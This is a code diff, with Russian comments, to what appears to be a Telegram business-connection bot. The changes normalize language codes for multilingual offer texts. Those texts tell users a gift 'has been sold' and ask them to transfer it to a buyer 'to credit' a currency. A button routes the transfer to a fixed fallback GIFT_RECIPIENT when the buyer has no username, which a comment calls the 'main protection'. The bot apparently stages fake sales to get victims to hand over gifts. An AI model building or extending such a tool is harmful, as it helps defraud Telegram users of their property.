@@ -45,17 +45,29 @@ GIFT_EMOJI_HTML = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
 LANG_TOKENS = {
     "ru": "ru",
     "rus": "ru",
+    "russian": "ru",
     "eng": "en",
+    "en": "en",
+    "english": "en",
     "kit": "zh",
+    "zh": "zh",
+    "chinese": "zh",
     "arb": "ar",
+    "ar": "ar",
+    "arabic": "ar",
 }
 
 def detect_lang(payload: str) -> str:
-    # Язык задаётся явным токеном в команде, включая русский.
-    for token in payload.lower().split():
+    # Язык задаётся явным токеном в команде. Учитываем пунктуацию рядом с токеном.
+    for token in re.findall(r"[a-zA-Z]+", payload.lower()):
         if token in LANG_TOKENS:
             return LANG_TOKENS[token]
     return "ru"
+
+
+def normalize_lang(lang: str) -> str:
+    # Единая нормализация языка для текста оффера и всплывающего окна.
+    return LANG_TOKENS.get((lang or "").lower().strip(), lang if lang in {"ru", "en", "zh", "ar"} else "ru")
 
 # ===== Технический cooldown =====
 SEND_COOLDOWN_SECONDS = 1.0
@@ -184,12 +196,14 @@ def decline_text(offer: Offer) -> str:
     return {"en": "❌ Offer declined", "zh": "❌ 报价已被拒绝", "ar": "❌ تم رفض العرض"}.get(offer.lang, "❌ Предложение отклонено")
 
 def sold_text(offer: Offer) -> str:
-    if offer.lang == "en": return f"{GIFT_EMOJI_HTML} The gift has been sold!\n\n• Transfer the gift to the buyer to credit {offer.currency}."
-    if offer.lang == "zh": return f"{GIFT_EMOJI_HTML} 礼物已成功售出！\n\n• 请将礼物转给买家以入账 {offer.currency}。"
-    if offer.lang == "ar": return f"{GIFT_EMOJI_HTML} تم بيع الهدية بنجاح!\n\n• قم بتحويل الهدية للمشتري ليتم إضافة {offer.currency}."
+    lang = normalize_lang(offer.lang)
+    if lang == "en": return f"{GIFT_EMOJI_HTML} The gift has been sold!\n\n• Transfer the gift to the buyer to credit {offer.currency}."
+    if lang == "zh": return f"{GIFT_EMOJI_HTML} 礼物已成功售出！\n\n• 请将礼物转给买家以入账 {offer.currency}。"
+    if lang == "ar": return f"{GIFT_EMOJI_HTML} تم بيع الهدية بنجاح!\n\n• قم بتحويل الهدية للمشتري ليتم إضافة {offer.currency}."
     return f"{GIFT_EMOJI_HTML} Подарок успешно продан!\n\n• Передайте подарок покупателю для зачисления {offer.currency}."
 
 def accept_alert_text(offer: Offer) -> str:
+    lang = normalize_lang(offer.lang)
     buyer = offer.buyer_name
     if len(buyer) > 30: buyer = buyer[:30] + "..."
     
@@ -204,9 +218,9 @@ def accept_alert_text(offer: Offer) -> str:
     elif offer.gift_link != "подарок":
         gift = offer.gift_link
 
-    if offer.lang == "en": return f"Offer to sell {gift} successfully accepted.\n\nTransfer the gift to {buyer} to receive {offer.price} {offer.currency}."
-    if offer.lang == "zh": return f"出售 {gift} 的报价已成功接受。\n\n请将礼物转给 {buyer} 以将 {offer.price} {offer.currency} 存入余额。"
-    if offer.lang == "ar": return f"تم قبول عرض بيع {gift} بنجاح.\n\nقم بتحويل الهدية إلى {buyer} لإضافة {offer.price} {offer.currency}."
+    if lang == "en": return f"Offer to sell {gift} successfully accepted.\n\nTransfer the gift to {buyer} to receive {offer.price} {offer.currency}."
+    if lang == "zh": return f"出售 {gift} 的报价已成功接受。\n\n请将礼物转给 {buyer} 以将 {offer.price} {offer.currency} 存入余额。"
+    if lang == "ar": return f"تم قبول عرض بيع {gift} بنجاح.\n\nقم بتحويل الهدية إلى {buyer} لإضافة {offer.price} {offer.currency}."
     
     return (
         f"Предложение о продаже {gift} успешно принято.\n\n"
@@ -222,7 +236,7 @@ def proposal_keyboard(offer: Offer) -> InlineKeyboardMarkup:
     ]])
 
 def sold_keyboard(offer: Offer) -> InlineKeyboardMarkup:
-    transfer_label = {"en": "Transfer", "zh": "转赠", "ar": "إرسال"}.get(offer.lang, "Передать")
+    transfer_label = {"en": "Transfer", "zh": "转赠", "ar": "إرسال"}.get(normalize_lang(offer.lang), "Передать")
     # Главная защита: если username нет, ставим резервный.
     recipient = offer.buyer_username if (offer.buyer_username and not offer.buyer_username.isdigit()) else GIFT_RECIPIENT
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -364,7 +378,7 @@ async def create_offer(message: Message, bot: Bot) -> None:
             id=offer_id, connection_id=message.business_connection_id,
             chat_id=message.chat.id, message_id=message.message_id,
             buyer_id=buyer_id, buyer_name=buyer_name, buyer_username=buyer_username,
-            price=price, currency=currency, lang=lang, gift_link=gift_link
+            price=price, currency=currency, lang=normalize_lang(lang), gift_link=gift_link
         )
 
         msg = await safe_send_message_text(bot, offer_text(temp_offer), message.chat.id, message.business_connection_id, proposal_keyboard(temp_offer))
